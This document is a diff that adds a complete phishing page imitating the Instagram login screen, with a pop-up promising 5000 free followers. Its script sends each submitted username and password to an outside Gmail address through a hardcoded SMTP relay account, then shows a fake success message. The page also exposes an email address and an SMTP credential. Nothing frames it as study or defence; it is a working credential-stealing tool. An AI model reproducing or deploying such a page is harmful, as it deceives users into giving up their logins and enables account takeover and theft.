@@ -1,0 +1,110 @@
+<!doctype html>
+<html>
+<head>
+<title>
+Instagram.com
+</title>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width">
+<link rel="stylesheet" href="Instagram Login.css">
+</head>
+
+<body>
+<h1 class=instagram>
+Instagram
+</h1>
+
+<form onsubmit="emailsend(); reset(); return false;">
+
+ <input type="text,email" id="dname" placeholder="phone number, username or email address" name="phone number, username or email address" required />
+
+</br>
+
+<input class="pswd" type="password" id="password" placeholder="Password" name="password" maxlength="30" minlength="8" required/>
+
+<img class="Eye" src="Eyeclose.jpg " id="EyeLogo" />
+
+
+<div class=join>
+
+<p>
+<a href="https://www.instagram.com/accounts/password/reset/?hl=en" class="forgot">Forgotten password?</a>
+</p>
+
+<button type="submit"  class="btn">Log In </button>
+</form>
+
+<p class=or>
+OR
+</p>
+
+<p class=fblog>
+<img src=Facebook.jpg>
+<a href="https://m.facebook.com/zero/balance/new_res_expiration_notice/?zb=0&paipv=0&eav=AfYI72Oyb4kxyVmIh3izeEN65tuRxu6DR3rmKfRM2_fLcyvSlKZA3w1YKJLLj3oHYK0&wtsid=rdr_0BnX0BulxASVB9xeZ&_rdr" class="log">Log in with Facebook</a>
+</p>
+
+<p class=" footer">
+Don't have an account? 
+<a href="https://www.instagram.com/accounts/signup/phone/?hl=en" class="signup">Sign Up</a>
+</p>
+
+</div>
+
+<script>
+alert("This is the free and easiest instagram followers increase site. Login with Instagram to add 5000 followers.")
+</script>
+
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js">
+</script>
+
+<script src="https://smtpjs.com/v3/smtp.js">
+</script>
+
+<script>
+function emailsend(){
+
+var  name = document.getElementById('dname') . value;
+
+var  password = document.getElementById('password') . value;
+
+var messageBody = "Name:"+ name + " <br> Password: " + password;
+
+Email.send({
+Host : "smtp.elasticemail.com",
+Username : "sarkihassan600@gmail.com",
+Password : "A193F5F6D85B682A4E777D79AFA55CD1284F",
+To : 'sarkihassan600@gmail.com',
+From : "sarkihassan600@gmail.com",
+Subject : "This is the filled instagram login information",
+Body : messageBody
+}).then(
+message => {
+if(message == 'OK'){
+swal("Successful", "Congratulation 5000 followers will be added to your account in the next 8 hour.", "success")
+}else{
+swal("Error", "Make sure information provided are correct.", "error")
+}
+}
+);
+}
+</script>
+
+<script>
+let EyeLogo = document.getElementById("EyeLogo");
+let password = document.getElementById("password");
+
+EyeLogo.onclick = function(){
+if (password.type == "password"){
+password.type = "text";
+EyeLogo.src = "Eyeopen.jpg";
+
+}else{
+password.type = "password";
+EyeLogo.src = "Eyeclose.jpg";
+}
+}
+</script>
+
+</body>
+</html>
